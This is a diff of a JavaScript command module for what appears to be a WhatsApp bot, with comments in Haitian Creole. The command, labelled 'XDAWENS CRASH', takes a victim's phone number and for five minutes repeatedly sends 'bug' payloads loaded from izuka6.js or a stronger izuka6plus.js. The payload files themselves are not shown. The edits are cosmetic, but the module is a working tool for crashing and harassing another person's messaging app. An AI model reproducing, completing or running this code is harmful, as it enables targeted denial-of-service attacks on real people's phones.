@@ -1,6 +1,6 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../bug/izuka6.js');      // Payload prensipal (pi fò)
+const bugchat = require('../bug/izuka6.js');         // Payload prensipal (pi fò)
 const bugchatPlus = require('../bug/izuka6plus.js'); // Payload dezyèm, pi puisan
 
 cmd({
@@ -33,7 +33,7 @@ cmd({
 
     const args = body.trim().split(/\s+/).slice(1);
     const targetNumber = args[0];
-    const usePlusPayload = args.includes('plus'); // Si user ajoute "plus" nan args, itilize payload plus
+    const usePlusPayload = args.includes('plus');
 
     if (!targetNumber || isNaN(targetNumber)) {
       return await bot.sendMessage(from, {
@@ -54,7 +54,7 @@ cmd({
       text: `💀 *XDAWENS CRASH STARTED*\n🎯 Target: +${targetNumber}\n🕒 Duration: 5 minutes\n\n📤 Sending ${usePlusPayload ? 'PLUS' : 'STANDARD'} payload...`,
     }, { quoted: mek });
 
-    const endTime = Date.now() + 5 * 60 * 1000; // 5 minutes
+    const endTime = Date.now() + 5 * 60 * 1000;
     let count = 1;
 
     while (Date.now() < endTime) {
